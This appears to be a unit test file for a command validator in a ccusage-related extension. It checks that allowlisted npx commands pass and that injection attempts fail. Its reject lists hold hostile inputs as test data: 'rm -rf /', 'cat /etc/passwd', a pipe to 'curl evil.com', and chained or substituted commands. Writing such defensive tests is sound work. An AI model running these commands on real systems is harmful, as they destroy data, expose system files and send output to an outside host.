import * as assert from 'assert';
import { SecureCommandValidator } from '../../commandValidator';

suite('SecureCommandValidator Unit Tests', () => {
    let validator: SecureCommandValidator;

    setup(() => {
        validator = new SecureCommandValidator();
    });

    test('validateCommand - should accept valid ccusage commands', () => {
        const validCommands = [
            'npx ccusage@latest blocks',
            'npx ccusage blocks --live',
            'wsl npx ccusage@latest status',
            'npx ccusage@1.0.0 usage'
        ];

        validCommands.forEach(command => {
            const result = validator.validateCommand(command);
            assert.strictEqual(result.isValid, true, `Command should be valid: ${command}`);
            assert.ok(result.sanitizedCommand, `Should have sanitized command for: ${command}`);
        });
    });

    test('validateCommand - should reject dangerous commands', () => {
        const dangerousCommands = [
            'rm -rf /',
            'npx ccusage; rm -rf /',
            'npx ccusage && malicious-script',
            'npx ccusage | curl evil.com',
            'npx ccusage@latest blocks; echo "pwned"',
            'cat /etc/passwd',
            'sudo rm -rf /',
            'npx ccusage`malicious`'
        ];

        dangerousCommands.forEach(command => {
            const result = validator.validateCommand(command);
            assert.strictEqual(result.isValid, false, `Command should be invalid: ${command}`);
            assert.ok(result.error, `Should have error message for: ${command}`);
        });
    });

    test('validateCommand - should reject empty or null commands', () => {
        const invalidInputs = ['', '   ', '\t\n'];

        invalidInputs.forEach(input => {
            const result = validator.validateCommand(input);
            assert.strictEqual(result.isValid, false, `Should reject empty input: "${input}"`);
        });
    });

    test('validateCommand - should sanitize valid commands', () => {
        const command = '  npx ccusage@latest blocks  ';
        const result = validator.validateCommand(command);
        
        assert.strictEqual(result.isValid, true);
        assert.strictEqual(result.sanitizedCommand, 'npx ccusage@latest blocks');
    });

    test('validateCommand - should reject unknown packages', () => {
        const maliciousPackages = [
            'npx malicious-package',
            'npx @evil/package',
            'npx unknown-ccusage-variant'
        ];

        maliciousPackages.forEach(command => {
            const result = validator.validateCommand(command);
            assert.strictEqual(result.isValid, false, `Should reject malicious package: ${command}`);
        });
    });

    test('validateCommand - should handle WSL commands correctly', () => {
        const wslCommand = 'wsl npx ccusage@latest blocks';
        const result = validator.validateCommand(wslCommand);
        
        assert.strictEqual(result.isValid, true);
        assert.strictEqual(result.sanitizedCommand, wslCommand);
    });

    test('validateCommand - should reject commands with script injection attempts', () => {
        const injectionAttempts = [
            'npx ccusage@latest blocks $(malicious)',
            'npx ccusage@latest blocks `evil`',
            'npx ccusage@latest blocks ${injection}',
            'npx ccusage@latest blocks; evil-command'
        ];

        injectionAttempts.forEach(command => {
            const result = validator.validateCommand(command);
            assert.strictEqual(result.isValid, false, `Should reject injection attempt: ${command}`);
        });
    });
});